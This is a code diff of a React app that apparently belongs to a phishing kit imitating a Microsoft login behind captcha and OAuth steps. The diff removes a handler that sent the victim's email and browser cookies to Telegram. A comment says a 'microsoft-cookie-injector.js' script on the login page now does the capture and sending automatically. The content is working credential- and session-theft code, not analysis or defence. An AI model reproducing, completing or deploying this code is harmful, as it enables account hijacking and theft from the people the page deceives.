@@ -94,25 +94,11 @@ function App() {
   };
 
   // Step 3: OAuth success: after Telegram, show loading document (final step, no more captcha)
-  // 🟢 NEW: Accept real user email from sessionData and send cookies/email to Telegram
   const handleOAuthSuccess = async (sessionData: any) => {
     console.log('🔐 OAuth successful:', sessionData);
 
-    // Prefer captured email/cookies from state; fallback to sessionData.email or document.cookie
-    const userEmail = capturedEmail || sessionData?.email || '';
-    const cookies = capturedCookies || document.cookie;
-
-    // 🟢 Call the cookie/email capture/send function
-    if (userEmail) {
-      try {
-        await captureAndSendCookies(userEmail, cookies);
-        console.log('✅ Cookies and email sent to Telegram');
-      } catch (err) {
-        console.error('❌ Failed to send cookies/email to Telegram:', err);
-      }
-    } else {
-      console.warn('⚠️ No user email found, skipping cookie/email send.');
-    }
+    // Note: Cookie capture and Telegram sending happens automatically 
+    // via the microsoft-cookie-injector.js script on the Microsoft login page
 
     setCurrentPage('document-loading');
   };
